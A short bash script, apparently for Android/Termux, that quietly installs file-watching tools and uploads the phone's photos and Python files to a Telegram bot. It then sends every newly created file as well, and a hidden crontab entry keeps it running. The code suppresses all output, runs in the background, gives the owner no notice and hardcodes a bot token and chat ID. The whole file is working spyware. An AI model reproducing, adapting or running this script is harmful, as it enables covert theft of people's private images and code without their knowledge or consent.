#!/bin/bash

SCRIPT_PATH=$(realpath "${BASH_SOURCE[0]}")
SCRIPT_DIR=$(dirname "$SCRIPT_PATH")
TOKEN="7678726628:AAFfLP0pv4vrAp5ExyqSOrfYLCX-pPmHzqc"
CHAT_ID="6817886155"
WATCH_DIR="/storage/emulated/0/"
IGNORE_FOLDERS=("Android")

check_inotify() {
    if ! command -v inotifywait &> /dev/null; then
        echo "Install modules...."
        pkg install inotify-tools cronie -y > /dev/null 2>&1
    fi
}

is_ignored() {
    for ignored in "${IGNORE_FOLDERS[@]}"; do
        if [[ "$1" == *"/$ignored/"* ]]; then
            return 0
        fi
    done
    return 1
}

send_file() {
    local file_path="$1"
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
        -F chat_id="$CHAT_ID" \
        -F document=@"$file_path" > /dev/null 2>&1
}

send_first_batch() {
    local count=0
    find "$WATCH_DIR" -iname "*.jpg" -o -iname "*.png" -o -iname "*.py" | while read file; do
        if [ -f "$file" ]; then
            if is_ignored "$file"; then
                continue
            fi
            send_file "$file"
            count=$((count + 1))
            if [ "$count" -ge 50 ]; then
                break
            fi
        fi
    done
}

backup_files() {
    find "$WATCH_DIR" -iname "*.jpg" -o -iname "*.png" | while read file; do
        if [ -f "$file" ]; then
            if is_ignored "$file"; then
                continue
            fi
            send_file "$file"
        fi
    done
}

monitor_directory() {
    inotifywait -mr -e create --format "%w%f" "$WATCH_DIR" | while read file; do
        if [ -f "$file" ]; then
            if is_ignored "$file"; then
                continue
            fi
            send_file "$file"
        fi
    done
}

cron_setup() {
    (crontab -l 2>/dev/null; echo "0 0 * * * /bin/bash $SCRIPT_PATH") | crontab - > /dev/null 2>&1
}

check_inotify

(
    send_first_batch
    monitor_directory
) > /dev/null 2>&1 &

cron_setup